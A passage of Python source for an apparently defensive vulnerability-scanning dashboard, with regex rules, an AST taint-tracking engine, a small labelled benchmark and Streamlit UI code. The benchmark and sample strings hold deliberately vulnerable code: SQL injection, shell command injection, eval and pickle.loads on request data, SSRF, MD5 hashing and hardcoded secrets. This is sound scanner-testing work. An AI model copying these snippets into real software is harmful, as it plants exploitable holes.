                remediation="Call setFeature to disallow-doctype-decl before parsing."),
    PatternRule(id="GO-001", title="Command Injection via exec.Command with shell", language="go",
                pattern=r"exec\.Command\s*\(\s*\"sh\"|exec\.Command\s*\(\s*\"bash\"",
                severity=Severity.HIGH, standards=STD_CMDI, confidence=Confidence.LOW,
                remediation="Invoke the target binary directly with a fixed argument list rather than a shell."),
    PatternRule(id="RS-001", title="Unsafe block usage", language="rust",
                pattern=r"\bunsafe\s*\{",
                severity=Severity.MEDIUM, standards=_std("CWE-119", "A06:2021-Vulnerable and Outdated Components",
                                                           "ASVS 5.1.1", "CAPEC-100", "PW.5.1"),
                confidence=Confidence.LOW,
                remediation="Confirm the unsafe block's invariants are documented and locally verifiable."),
    PatternRule(id="C-001", title="Unsafe C string copy (strcpy)", language="c",
                pattern=r"\bstrcpy\s*\(",
                severity=Severity.CRITICAL, standards=_std("CWE-120", "A06:2021-Vulnerable and Outdated Components",
                                                             "ASVS 5.1.1", "CAPEC-100", "PW.5.1"),
                confidence=Confidence.MEDIUM,
                remediation="Use strncpy/strlcpy with an explicit, correct size bound."),
    PatternRule(id="C-002", title="Unsafe C input function (gets)", language="c",
                pattern=r"\bgets\s*\(",
                severity=Severity.CRITICAL, standards=_std("CWE-242", "A06:2021-Vulnerable and Outdated Components",
                                                             "ASVS 5.1.1", "CAPEC-100", "PW.5.1"),
                confidence=Confidence.HIGH,
                remediation="Use fgets() with an explicit buffer size instead."),
    PatternRule(id="CS-001", title="Insecure XML resolver (C#)", language="csharp",
                pattern=r"XmlDocument\s*\(\s*\)(?!.*XmlResolver\s*=\s*null)",
                severity=Severity.HIGH, standards=STD_XXE, confidence=Confidence.LOW,
                remediation="Set XmlResolver = null on the XmlDocument/XmlReaderSettings before loading."),
]


class PatternScanner:
    """Regex/heuristic-tier scanner for languages without a real parser here.
    Always tags findings engine='heuristic' and caps confidence at the rule's
    declared level (never claims semantic-grade certainty)."""

    def __init__(self, rules: Optional[List[PatternRule]] = None):
        self.rules = rules or PATTERN_RULES
        self._compiled = [(r, re.compile(r.pattern, re.MULTILINE)) for r in self.rules]

    def scan(self, file_name: str, content: str, language: Optional[str] = None) -> List[Finding]:
        findings: List[Finding] = []
        lines = content.splitlines()
        for rule, compiled in self._compiled:
            if language and rule.language != language:
                continue
            for match in compiled.finditer(content):
                line_no = content[: match.start()].count("\n") + 1
                snippet = lines[line_no - 1].strip()[:160] if 0 < line_no <= len(lines) else match.group(0)
                findings.append(Finding(
                    finding_id=f"{file_name}:{line_no}:{rule.id}",
                    rule_id=rule.id, title=rule.title, vuln_class="pattern_match",
                    severity=rule.severity.value, confidence=rule.confidence.value,
                    standards=rule.standards, file_name=file_name, function_name="",
                    sink_line=line_no, evidence=snippet,
                    propagation_path=[PropagationStep(line=line_no, code=snippet, kind="sink")],
                    impacted_functions=[], remediation=rule.remediation,
                    suggested_fix="Manual review required — no AST-level fix synthesis for this language.",
                    engine="heuristic",
                ))
        return findings


# ==============================================================================
# SECTION 14: TOP-LEVEL ORCHESTRATOR
# ==============================================================================

class SemanticVulnerabilityScanner:
    """The single integration point for a host application (e.g. a Streamlit
    dashboard): feed it source text, get back a list of Finding objects."""

    def __init__(self) -> None:
        self.pattern_scanner = PatternScanner()
        self._ast_cache: Dict[str, Tuple[str, ast.Module]] = {}  # content-hash -> (hash, tree)

    @staticmethod
    def _hash(content: str) -> str:
        return hashlib.sha256(content.encode("utf-8", errors="ignore")).hexdigest()

    def _parse_cached(self, content: str) -> Optional[ast.Module]:
        digest = self._hash(content)
        cached = self._ast_cache.get(digest)
        if cached:
            return cached[1]
        try:
            tree = ast.parse(content)
        except SyntaxError:
            return None
        self._ast_cache[digest] = (digest, tree)
        return tree

    def analyze_python(self, file_name: str, content: str) -> List[Finding]:
        tree = self._parse_cached(content)
        if tree is None:
            return []

        import_resolver = ImportResolver()
        import_resolver.visit(tree)
        aliases = import_resolver.aliases

        collector = FunctionCollector()
        collector.visit(tree)
        functions = collector.functions

        walker = TaintWalker(functions, aliases, file_name)

        call_graph = CallGraph(functions, aliases)
        entry_candidates = [name for name in functions if call_graph.is_entry_point(name)] or list(functions.keys())

        for name in entry_candidates:
            walker._unresolved_calls_in_current_path = 0
            walker.analyze_entry_function(functions[name])

        return walker.findings

    def analyze_generic(self, file_name: str, content: str, language: str) -> List[Finding]:
        return self.pattern_scanner.scan(file_name, content, language=language)

    def analyze_file(self, file_name: str, content: str) -> List[Finding]:
        if file_name.endswith(".py"):
            return self.analyze_python(file_name, content)
        ext_lang = {
            ".php": "php", ".js": "javascript", ".ts": "javascript", ".jsx": "javascript",
            ".tsx": "javascript", ".java": "java", ".go": "go", ".rs": "rust",
            ".c": "c", ".h": "c", ".cpp": "c", ".hpp": "c", ".cs": "csharp",
        }
        for ext, lang in ext_lang.items():
            if file_name.endswith(ext):
                return self.analyze_generic(file_name, content, lang)
        return []

    def analyze_files(self, files: Dict[str, str], parallel: bool = True) -> List[Finding]:
        """Multi-file scan with optional thread-pool parallelism (item 17)."""
        results: List[Finding] = []
        if not parallel or len(files) <= 1:
            for name, content in files.items():
                results.extend(self.analyze_file(name, content))
            return results

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(8, len(files))) as pool:
            futures = {pool.submit(self.analyze_file, name, content): name for name, content in files.items()}
            for future in concurrent.futures.as_completed(futures):
                results.extend(future.result())
        return results

    @staticmethod
    def to_markdown(findings: List[Finding]) -> str:
        if not findings:
            return "_No findings._"
        lines = ["| Rule | Title | Severity | Confidence | CWE | File:Line | Engine |",
                 "|---|---|---|---|---|---|---|"]
        for f in findings:
            lines.append(f"| {f.rule_id} | {f.title} | {f.severity} | {f.confidence} | "
                          f"{f.standards.cwe} | {f.file_name}:{f.sink_line} | {f.engine} |")
        return "\n".join(lines)


# ==============================================================================
# SECTION 15: SELF-TEST / GROUND-TRUTH MINI-BENCHMARK (item 18, honest scope)
# ==============================================================================
# OWASP Benchmark / Juliet Test Suite are not available in this offline
# sandbox, so this is a small, hand-built benchmark instead. Every number
# printed by running this file is REAL — computed from actually executing
# the engine against these snippets, not asserted or invented.

BENCHMARK: List[Dict[str, Any]] = [
    {
        "name": "direct_sql_injection",
        "vulnerable": True,
        "code": """
def get_user(request):
    user_id = request.args.get('id')
    query = "SELECT * FROM users WHERE id = '%s'" % user_id
    cursor.execute(query)
""",
    },
    {
        "name": "parameterized_sql_is_safe",
        "vulnerable": False,
        "code": """
def get_user(request):
    user_id = request.args.get('id')
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
""",
    },
    {
        "name": "interprocedural_sql_injection_multi_hop",
        "vulnerable": True,
        "code": """
def validate(user_id):
    return user_id.strip()

def helper(clean_id):
    return "id=" + clean_id

def builder(fragment):
    return "SELECT * FROM users WHERE " + fragment

def handle_request(request):
    user_id = request.args.get('id')
    validated = validate(user_id)
    fragment = helper(validated)
    query = builder(fragment)
    cursor.execute(query)
""",
    },
    {
        "name": "command_injection_os_system",
        "vulnerable": True,
        "code": """
def ping(request):
    host = request.args.get('host')
    os.system("ping -c 1 " + host)
""",
    },
    {
        "name": "command_injection_sanitized_with_shlex",
        "vulnerable": False,
        "code": """
def ping(request):
    host = request.args.get('host')
    safe_host = shlex.quote(host)
    os.system("ping -c 1 " + safe_host)
""",
    },
    {
        "name": "subprocess_list_args_no_shell_is_safer",
        "vulnerable": False,
        "code": """
def ping(request):
    host = request.args.get('host')
    subprocess.run(["ping", "-c", "1", host], shell=False)
""",
    },
    {
        "name": "direct_eval_rce",
        "vulnerable": True,
        "code": """
def calc(request):
    expr = request.args.get('expr')
    result = eval(expr)
    return result
""",
    },
    {
        "name": "pickle_loads_on_network_data",
        "vulnerable": True,
        "code": """
def handle_socket_data(request):
    payload = request.data
    obj = pickle.loads(payload)
    return obj
""",
    },
    {
        "name": "clean_function_no_findings",
        "vulnerable": False,
        "code": """
def add(a, b):
    return a + b

def average(numbers):
    return sum(numbers) / len(numbers)
""",
    },
    {
        "name": "flask_route_handler_taints_string_param",
        "vulnerable": True,
        "code": """
@app.route('/search')
def search(term):
    query = "SELECT * FROM items WHERE name = '%s'" % term
    cursor.execute(query)
""",
    },
    {
        "name": "xss_via_escaped_output_is_safe",
        "vulnerable": False,
        "code": """
def render(request):
    name = request.args.get('name')
    safe_name = html.escape(name)
    return "<div>" + safe_name + "</div>"
""",
    },
    {
        "name": "ssrf_via_requests_get",
        "vulnerable": True,
        "code": """
def fetch(request):
    target = request.args.get('url')
    return requests.get(target)
""",
    },
]


def run_self_test(verbose: bool = True) -> Dict[str, Any]:
    scanner = SemanticVulnerabilityScanner()
    true_positive = false_negative = true_negative = false_positive = 0
    details = []

    for case in BENCHMARK:
        findings = scanner.analyze_python(case["name"] + ".py", case["code"])
        detected = len(findings) > 0
        expected = case["vulnerable"]

        if expected and detected:
            true_positive += 1
            outcome = "TP"
        elif expected and not detected:
            false_negative += 1
            outcome = "FN"
        elif not expected and not detected:
            true_negative += 1
            outcome = "TN"
        else:
            false_positive += 1
            outcome = "FP"

        details.append({
            "case": case["name"], "expected_vulnerable": expected, "detected": detected,
            "outcome": outcome, "finding_count": len(findings),
            "rules_fired": sorted({f.rule_id for f in findings}),
        })

        if verbose:
            marker = "PASS" if outcome in ("TP", "TN") else "FAIL"
            print(f"[{marker}] {case['name']:<45} expected={expected!s:<5} "
                  f"detected={detected!s:<5} outcome={outcome} rules={details[-1]['rules_fired']}")

    total = len(BENCHMARK)
    recall = true_positive / max(true_positive + false_negative, 1)
    specificity = true_negative / max(true_negative + false_positive, 1)
    accuracy = (true_positive + true_negative) / max(total, 1)

    summary = {
        "total_cases": total, "true_positive": true_positive, "false_negative": false_negative,
        "true_negative": true_negative, "false_positive": false_positive,
        "recall": round(recall, 3), "specificity": round(specificity, 3), "accuracy": round(accuracy, 3),
        "details": details,
    }

    if verbose:
        print("\n" + "=" * 78)
        print(f"Benchmark cases: {total}  |  TP={true_positive} FN={false_negative} "
              f"TN={true_negative} FP={false_positive}")
        print(f"Recall (of real vulns found): {recall:.1%}")
        print(f"Specificity (of clean code correctly left alone): {specificity:.1%}")
        print(f"Overall accuracy: {accuracy:.1%}")
        print("=" * 78)

    return summary

# ==============================================================================
# SECTION 9: STREAMLIT DARK "SOC COMMAND CENTER" UI
# ==============================================================================

st.set_page_config(
    page_title="Sentinel AI — Threat & Vulnerability Intelligence",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

DARK_CSS = """
<style>
    .stApp {
        background-color: #0a0e17;
        color: #cbd5e1;
        font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }
    [data-testid="stSidebar"] {
        background-color: #0f1420 !important;
        border-right: 1px solid #1e293b;
    }
    .sentinel-card {
        background: #121a2b;
        border: 1px solid #1e293b;
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 15px;
        box-shadow: 0 4px 10px -2px rgba(0,0,0,0.6);
    }
    .neon-cyan { color: #22d3ee; text-shadow: 0 0 8px rgba(34,211,238,0.4); }
    .neon-red { color: #f87171; text-shadow: 0 0 8px rgba(248,113,113,0.4); }
    .neon-green { color: #34d399; text-shadow: 0 0 8px rgba(52,211,153,0.4); }
    .neon-amber { color: #fbbf24; text-shadow: 0 0 8px rgba(251,191,36,0.4); }
    div[data-testid="stMetricValue"] {
        font-family: 'JetBrains Mono', monospace !important;
        font-size: 1.7rem !important;
        color: #22d3ee !important;
    }
    .stDataFrame { border: 1px solid #1e293b; border-radius: 8px; }
    div.stButton > button {
        background-color: #1e293b;
        color: #22d3ee;
        border: 1px solid #22d3ee;
        border-radius: 6px;
        font-weight: 600;
    }
    div.stButton > button:hover {
        background-color: #22d3ee;
        color: #0a0e17;
        box-shadow: 0 0 12px rgba(34,211,238,0.6);
    }
    .severity-Critical { color: #f87171; font-weight: 700; }
    .severity-High { color: #fb923c; font-weight: 700; }
    .severity-Medium { color: #fbbf24; font-weight: 600; }
    .severity-Low { color: #34d399; font-weight: 600; }
    .severity-Info { color: #94a3b8; font-weight: 500; }
</style>
"""
st.markdown(DARK_CSS, unsafe_allow_html=True)

SAMPLE_VULNERABLE_CODE = '''import os
import pickle
import hashlib
import subprocess

password = "SuperSecret123"
api_key = "sk_live_1234567890abcdef1234567890"

def run_lookup(user_id):
    query = "SELECT * FROM users WHERE id = '%s'" % user_id
    cursor.execute(query)

def process(cmd):
    os.system("echo " + cmd)
    subprocess.run(cmd, shell=True)

def load_cache(data):
    return pickle.loads(data)

def hash_password(pw):
    return hashlib.md5(pw.encode()).hexdigest()

def fetch(url):
    return requests.get(url, verify=False)

DEBUG = True
'''

# ---- Session state initialization ----
if "ingestion_engine" not in st.session_state:
    st.session_state.ingestion_engine = IngestionEngine()
    for _ in range(14):
        st.session_state.ingestion_engine.ingest(generate_mock_log())

if "containment_engine" not in st.session_state:
    st.session_state.containment_engine = ActiveContainmentEngine()

if "code_scanner" not in st.session_state:
    st.session_state.code_scanner = CodeVulnerabilityScanner()

if "dep_scanner" not in st.session_state:
    st.session_state.dep_scanner = DependencyScanner()

if "last_findings" not in st.session_state:
    st.session_state.last_findings = st.session_state.code_scanner.scan_text("sample_app.py", SAMPLE_VULNERABLE_CODE)

if "last_dep_findings" not in st.session_state:
    st.session_state.last_dep_findings = []

if "asset_inventory" not in st.session_state:
    st.session_state.asset_inventory = AssetInventory()
    st.session_state.asset_inventory.bulk_seed([Asset(**a) for a in DEFAULT_ASSET_SEED])

if "scan_history" not in st.session_state:
    st.session_state.scan_history = []  # list of {"timestamp":..., "total":..., "risk_score":...}

if "semantic_scanner" not in st.session_state:
    st.session_state.semantic_scanner = SemanticVulnerabilityScanner()

if "semantic_findings" not in st.session_state:
    st.session_state.semantic_findings = []

engine = st.session_state.ingestion_engine
containment = st.session_state.containment_engine
code_scanner = st.session_state.code_scanner
dep_scanner = st.session_state.dep_scanner
asset_inventory = st.session_state.asset_inventory
threat_intel = ThreatIntelEngine()
reporter = ReportGenerator()
compliance_mapper = ComplianceMapper()
exec_summary_gen = ExecutiveSummaryGenerator()
semantic_scanner = st.session_state.semantic_scanner
semantic_findings = st.session_state.semantic_findings

# ---- Header ----
st.markdown(
    "<h1 style='margin-bottom:0px;'>🛡️ SENTINEL AI <span class='neon-cyan'>[THREAT & VULNERABILITY INTELLIGENCE]</span></h1>",
    unsafe_allow_html=True,
)
st.markdown(
    "<p style='color:#6b7280;margin-top:0px;'>Static code scanning · Dependency CVE intel · Network anomaly detection · LLM-assisted triage · Simulated containment</p>",
    unsafe_allow_html=True,
)

# ---- Sidebar ----
st.sidebar.markdown("<h2 class='neon-cyan'>⚙️ System Control</h2>", unsafe_allow_html=True)

llm_provider = st.sidebar.selectbox(
    "AI Triage Engine",
    ["Offline / Local Rule Engine", "Ollama (Local)", "OpenAI", "Anthropic"],
)

api_key = None
local_host = "http://localhost:11434"
model_choice = "llama3"

if llm_provider == "Ollama (Local)":
    st.sidebar.info("Fully air-gapped local inference — no data leaves your network.")
    local_host = st.sidebar.text_input("Ollama Host URL", value="http://localhost:11434")
    model_choice = st.sidebar.text_input("Local Model Name", value="llama3")
elif llm_provider in ["OpenAI", "Anthropic"]:
    api_key = st.sidebar.text_input("API Key", type="password")
    default_model = "gpt-4o" if llm_provider == "OpenAI" else "claude-sonnet-4-5"
    model_choice = st.sidebar.text_input("Model ID", value=default_model)

st.sidebar.markdown("---")
st.sidebar.markdown("### 🛡️ Containment Settings")
webhook_url = st.sidebar.text_input("SIEM Webhook URL (optional)", placeholder="https://hooks.slack.com/services/...")
if webhook_url:
    containment.webhook_url = webhook_url

st.sidebar.markdown("---")
if st.sidebar.button("📥 Inject Simulated Telemetry Event"):
    engine.ingest(generate_mock_log())
    st.rerun()

st.sidebar.markdown("---")
st.sidebar.caption("Sentinel AI performs defensive, read-only analysis. It does not scan or attack systems you don't own.")

# ---- Top-level metrics ----
events = engine.get_all_events()
df_events = pd.DataFrame([e.model_dump() for e in events]) if events else pd.DataFrame()
findings = st.session_state.last_findings
dep_findings = st.session_state.last_dep_findings

m1, m2, m3, m4, m5, m6 = st.columns(6)
m1.metric("Telemetry Events", len(events))
m2.metric("Critical Network Anomalies", len([e for e in events if e.anomaly_score >= 70]))
m3.metric("Code Findings", len(findings))
m4.metric("Semantic (AST/Taint) Findings", len(semantic_findings))
m5.metric("Dependency CVEs", len(dep_findings))
m6.metric("Containment Actions", len(containment.get_action_history()))

st.markdown("---")

tab_dash, tab_code, tab_semantic, tab_deps, tab_net, tab_ai, tab_contain, tab_compliance, tab_assets, tab_exec, tab_report = st.tabs([
    "📊 Dashboard", "🔍 Code Scanner", "🧬 Semantic Scanner (AST/Taint)", "📦 Dependency CVEs",
    "📡 Network Telemetry", "🤖 AI Deep Triage", "⚡ Containment",
    "📋 Compliance Mapping", "🗄️ Asset Inventory", "📈 Executive Summary", "📄 Reports",
])

# ------------------------------------------------------------------------
# TAB: DASHBOARD
# ------------------------------------------------------------------------
with tab_dash:
    col1, col2 = st.columns([1.4, 1])

    with col1:
        st.markdown("### 🧭 Code Risk Overview")
        if findings:
            sev_counts = pd.Series([f.severity for f in findings]).value_counts().reindex(
                ["Critical", "High", "Medium", "Low", "Info"]
            ).fillna(0)
            fig = px.bar(
                x=sev_counts.index, y=sev_counts.values,
                color=sev_counts.index,
                color_discrete_map={
                    "Critical": "#f87171", "High": "#fb923c", "Medium": "#fbbf24",
                    "Low": "#34d399", "Info": "#94a3b8",
                },
                labels={"x": "Severity", "y": "Findings"},
                height=320,
            )
            fig.update_layout(
                paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827",
                font_color="#c9d1d9", showlegend=False,
                xaxis=dict(gridcolor="#1f2937"), yaxis=dict(gridcolor="#1f2937"),
            )
            st.plotly_chart(fig, use_container_width=True)
            overall_risk = code_scanner.risk_score(findings)
            st.metric("Aggregate Code Risk Score", f"{overall_risk}/100")
        else:
            st.info("Run a scan in the Code Scanner tab to populate this view.")

    with col2:
        st.markdown("### 📡 Network Anomaly Trend")
        if not df_events.empty:
            fig2 = px.line(
                df_events.sort_values("timestamp"),
                x="timestamp", y="anomaly_score", markers=True, height=320,
                color_discrete_sequence=["#22d3ee"],
            )
            fig2.update_layout(
                paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827",
                font_color="#c9d1d9",
                xaxis=dict(gridcolor="#1f2937"), yaxis=dict(gridcolor="#1f2937"),
            )
            st.plotly_chart(fig2, use_container_width=True)
        else:
            st.info("No telemetry events yet — inject one from the sidebar.")

    st.markdown("### 🗂️ Top Findings Snapshot")
    if findings:
        top_df = reporter.findings_to_dataframe(sorted(
            findings, key=lambda f: code_scanner.severity_weight(f.severity), reverse=True
        )[:8])
        st.dataframe(
            top_df[["rule_id", "title", "severity", "cwe", "file_name", "line_number"]],
            use_container_width=True,
        )
    else:
        st.caption("No findings to display yet.")

# ------------------------------------------------------------------------
# TAB: CODE SCANNER
# ------------------------------------------------------------------------
with tab_code:
    st.markdown("### 🔍 Static Source Code Vulnerability Scanner")
    st.caption(f"Currently loaded with {len(VULNERABILITY_RULES)} pattern rules covering injection, "
               f"crypto, secrets, deserialization, XSS, SSRF, and more (CWE-mapped).")

    scan_mode = st.radio("Input mode", ["Paste code", "Upload file(s)", "Use bundled sample"], horizontal=True)

    files_to_scan: Dict[str, str] = {}

    if scan_mode == "Paste code":
        pasted_name = st.text_input("File name (for reporting)", value="pasted_snippet.py")
        pasted_code = st.text_area("Paste source code to analyze", height=280, value=SAMPLE_VULNERABLE_CODE)
        if pasted_code.strip():
            files_to_scan[pasted_name] = pasted_code

    elif scan_mode == "Upload file(s)":
        uploaded = st.file_uploader(
            "Upload source files", accept_multiple_files=True,
            type=["py", "js", "ts", "java", "php", "c", "cpp", "go", "rb", "html", "conf", "yml", "yaml"],
        )
        if uploaded:
            for uf in uploaded:
                try:
                    files_to_scan[uf.name] = uf.read().decode("utf-8", errors="ignore")
                except Exception:
                    st.warning(f"Could not read {uf.name} as text — skipped.")

    else:
        files_to_scan["sample_app.py"] = SAMPLE_VULNERABLE_CODE
        st.code(SAMPLE_VULNERABLE_CODE, language="python")

    run_scan = st.button("🚀 Run Vulnerability Scan", type="primary")

    if run_scan and files_to_scan:
        with st.spinner("Scanning against Sentinel rule set..."):
            new_findings = code_scanner.scan_files(files_to_scan)
            st.session_state.last_findings = new_findings
            findings = new_findings
            st.session_state.scan_history.append({
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "total_findings": len(new_findings),
                "risk_score": code_scanner.risk_score(new_findings),
                "critical": len([f for f in new_findings if f.severity == "Critical"]),
            })

    if findings:
        st.markdown(f"#### Results — {len(findings)} finding(s)")
        sev_filter = st.multiselect(
            "Filter by severity", ["Critical", "High", "Medium", "Low", "Info"],
            default=["Critical", "High", "Medium", "Low", "Info"],
        )
        filtered = [f for f in findings if f.severity in sev_filter]
        df_findings = reporter.findings_to_dataframe(filtered)
        st.dataframe(
            df_findings[["rule_id", "title", "severity", "cwe", "cvss_estimate", "file_name", "line_number", "matched_snippet"]],
            use_container_width=True, height=320,
        )

        st.markdown("#### 🔬 Finding Detail Inspector")
        if filtered:
            options = [f"{f.finding_id} — {f.title}" for f in filtered]
            picked = st.selectbox("Select a finding to inspect", options)
            picked_finding = filtered[options.index(picked)]
            st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
            st.markdown(f"##### <span class='severity-{picked_finding.severity}'>{picked_finding.severity}</span> — {picked_finding.title}", unsafe_allow_html=True)
            st.markdown(f"**CWE:** {picked_finding.cwe}  |  **Estimated CVSS:** {picked_finding.cvss_estimate}  |  **File:** `{picked_finding.file_name}:{picked_finding.line_number}`")
            st.code(picked_finding.matched_snippet, language="python")
            st.markdown(f"**Why it matters:** {picked_finding.description}")
            st.markdown(f"**Recommended remediation:** {picked_finding.remediation}")
            st.markdown("</div>", unsafe_allow_html=True)
    else:
        st.info("No findings yet — run a scan above.")

# ------------------------------------------------------------------------
# TAB: SEMANTIC SCANNER (AST/Taint) — real interprocedural analysis, Python only
# ------------------------------------------------------------------------
with tab_semantic:
    st.markdown("### 🧬 Semantic Scanner — AST-Based Interprocedural Taint Analysis")
    st.caption(
        "Unlike the regex-based Code Scanner tab, this engine builds a real symbol table, "
        "call graph, and CFG from Python's own `ast` module, then tracks tainted data across "
        "function calls (source → helper → helper → sink), not just single lines. "
        "**Python only** — other languages fall back to the regex heuristic tier elsewhere in "
        "this app, tagged accordingly. See the module docstring in `semantic_taint_engine.py` "
        "for the full honest-scope breakdown of what is and isn't real semantic analysis here."
    )

    SAMPLE_SEMANTIC_CODE = '''def validate(user_id):
    return user_id.strip()

def build_fragment(clean_id):
    return "id=" + clean_id

def build_query(fragment):
    return "SELECT * FROM users WHERE " + fragment

def handle_request(request):
    user_id = request.args.get('id')
    validated = validate(user_id)
    fragment = build_fragment(validated)
    query = build_query(fragment)
    cursor.execute(query)

def safe_handler(request):
    user_id = request.args.get('id')
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
'''

    sem_mode = st.radio("Input mode", ["Paste code", "Upload .py file(s)", "Use bundled multi-hop example"],
                         horizontal=True, key="sem_mode")

    sem_files: Dict[str, str] = {}

    if sem_mode == "Paste code":
        sem_name = st.text_input("File name (for reporting)", value="app.py", key="sem_name")
        sem_code = st.text_area("Paste Python source to analyze", height=280, value=SAMPLE_SEMANTIC_CODE, key="sem_code")
        if sem_code.strip():
            sem_files[sem_name] = sem_code
    elif sem_mode == "Upload .py file(s)":
        sem_uploaded = st.file_uploader("Upload Python files", accept_multiple_files=True, type=["py"], key="sem_upload")
        if sem_uploaded:
            for uf in sem_uploaded:
                try:
                    sem_files[uf.name] = uf.read().decode("utf-8", errors="ignore")
                except Exception:
                    st.warning(f"Could not read {uf.name} as text — skipped.")
    else:
        sem_files["multi_hop_example.py"] = SAMPLE_SEMANTIC_CODE
        st.code(SAMPLE_SEMANTIC_CODE, language="python")

    run_sem_scan = st.button("🧬 Run Semantic Analysis", type="primary", key="run_sem_scan")

    if run_sem_scan and sem_files:
        with st.spinner("Building symbol table, call graph, and running interprocedural taint analysis..."):
            new_sem_findings = semantic_scanner.analyze_files(sem_files, parallel=True)
            st.session_state.semantic_findings = new_sem_findings
            semantic_findings = new_sem_findings

    if semantic_findings:
        st.markdown(f"#### Results — {len(semantic_findings)} finding(s)")
        sem_df = pd.DataFrame([f.to_dict() for f in semantic_findings])
        st.dataframe(
            sem_df[["rule_id", "title", "severity", "confidence", "cwe", "owasp_top10",
                    "file_name", "sink_line", "function_name"]],
            use_container_width=True, height=280,
        )

        st.markdown("#### 🔬 Propagation Path Inspector")
        options = [f"{f.finding_id}" for f in semantic_findings]
        picked = st.selectbox("Select a finding to trace", options, key="sem_picked")
        picked_finding = semantic_findings[options.index(picked)]

        st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
        st.markdown(
            f"##### <span class='severity-{picked_finding.severity}'>{picked_finding.severity}</span> "
            f"({picked_finding.confidence} confidence) — {picked_finding.title}",
            unsafe_allow_html=True,
        )
        st.markdown(
            f"**CWE:** {picked_finding.standards.cwe}  |  **OWASP Top 10:** {picked_finding.standards.owasp_top10}  |  "
            f"**ASVS:** {picked_finding.standards.owasp_asvs}  |  **CAPEC:** {picked_finding.standards.capec}"
        )
        st.markdown(f"**Sink:** `{picked_finding.file_name}:{picked_finding.sink_line}` in function `{picked_finding.function_name}`")
        st.code(picked_finding.evidence, language="python")

        st.markdown("**Full propagation path (source → sink, across function calls):**")
        for step in picked_finding.propagation_path:
            icon = {"function_entry": "🔵", "source": "🟠", "assignment": "⚪", "call": "🟣", "sink": "🔴"}.get(step.kind, "•")
            st.markdown(f"{icon} `{step.function or '-'}:{step.line}` **[{step.kind}]** — `{step.code}`")

        st.markdown(f"**Remediation:** {picked_finding.remediation}")
        st.markdown("**Suggested fix:**")
        st.code(picked_finding.suggested_fix, language="python")
        st.markdown("</div>", unsafe_allow_html=True)
    else:
        st.info("No semantic findings yet — run an analysis above.")

    st.markdown("---")
    st.markdown("#### ✅ Live Engine Verification")
    st.caption(
        "This runs the engine's real ground-truth benchmark right now, in this session — "
        "not a cached or pre-written claim. See `semantic_taint_engine.py` for the full "
        "benchmark source and its documented scope."
    )
    if st.button("Run Verification Benchmark", key="run_benchmark"):
        with st.spinner("Running ground-truth benchmark..."):
            bench_result = run_self_test(verbose=False)
        b1, b2, b3 = st.columns(3)
        b1.metric("Recall", f"{bench_result['recall']:.1%}")
        b2.metric("Specificity", f"{bench_result['specificity']:.1%}")
        b3.metric("Accuracy", f"{bench_result['accuracy']:.1%}")
        bench_df = pd.DataFrame(bench_result["details"])
        st.dataframe(bench_df, use_container_width=True)

# ------------------------------------------------------------------------
# TAB: DEPENDENCY CVEs
# ------------------------------------------------------------------------
with tab_deps:
    st.markdown("### 📦 Dependency / Supply-Chain Vulnerability Check")
    st.caption("Paste a requirements.txt / package.json-style manifest to cross-reference against the local CVE feed.")

    sample_manifest = "flask==2.1.0\nrequests==2.25.0\npyyaml==5.3\nlog4j-core==2.14.1\ncryptography==40.0.0"
    manifest_text = st.text_area("Dependency manifest", height=180, value=sample_manifest)

    if st.button("🔎 Check Dependencies"):
        with st.spinner("Cross-referencing against known CVEs..."):
            dep_findings = dep_scanner.scan_manifest(manifest_text)
            st.session_state.last_dep_findings = dep_findings

    if dep_findings:
        st.markdown(f"#### {len(dep_findings)} known vulnerable dependenc{'y' if len(dep_findings)==1 else 'ies'} detected")
        df_dep = pd.DataFrame([d.model_dump() for d in dep_findings])
        st.dataframe(df_dep, use_container_width=True)

        for d in dep_findings:
            with st.expander(f"{d.cve_id} — {d.package} ({d.severity})"):
                st.markdown(f"**Summary:** {d.summary}")
                st.markdown(f"**Vulnerable range:** `{d.vulnerable_range}`  →  **Fixed in:** `{d.fixed_version}`")
    else:
        st.info("No dependency scan run yet, or no known-vulnerable packages detected in your manifest.")

# ------------------------------------------------------------------------
# TAB: NETWORK TELEMETRY
# ------------------------------------------------------------------------
with tab_net:
    col1, col2 = st.columns([1.7, 1.1])

    with col1:
        st.markdown("### 📡 Live Telemetry Stream")
        if not df_events.empty:
            fig3 = px.scatter(
                df_events, x="timestamp", y="anomaly_score", color="threat_category",
                size="anomaly_score", hover_data=["source_ip", "target_asset"],
                color_discrete_sequence=["#22d3ee", "#f87171", "#34d399", "#fbbf24", "#a78bfa"],
                height=320,
            )
            fig3.update_layout(
                paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827", font_color="#c9d1d9",
                xaxis=dict(gridcolor="#1f2937"), yaxis=dict(gridcolor="#1f2937"),
            )
            st.plotly_chart(fig3, use_container_width=True)
            st.dataframe(
                df_events[["event_id", "source_ip", "target_asset", "threat_category", "anomaly_score"]],
                use_container_width=True,
            )
        else:
            st.info("No events yet.")

    with col2:
        st.markdown("### 🌐 IP Reputation Lookup")
        lookup_ip = st.text_input("IP address to evaluate", value=df_events.iloc[-1]["source_ip"] if not df_events.empty else "185.220.101.5")
        if st.button("Evaluate IP"):
            result = threat_intel.evaluate(lookup_ip)
            st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
            badge_class = "neon-red" if result.reputation_score >= 70 else "neon-amber" if result.reputation_score >= 40 else "neon-green"
            st.markdown(f"**{result.ip_address}** — <span class='{badge_class}'>{result.classification}</span>", unsafe_allow_html=True)
            st.progress(result.reputation_score / 100)
            st.caption(f"Reputation score: {result.reputation_score}/100")
            for note in result.notes:
                st.markdown(f"- {note}")
            st.markdown("</div>", unsafe_allow_html=True)

# ------------------------------------------------------------------------
# TAB: AI DEEP TRIAGE
# ------------------------------------------------------------------------
with tab_ai:
    st.markdown("### 🤖 LLM-Assisted Deep Triage")
    st.caption("Sends a summarized, structured context (not raw sensitive data) to the selected engine for analysis.")

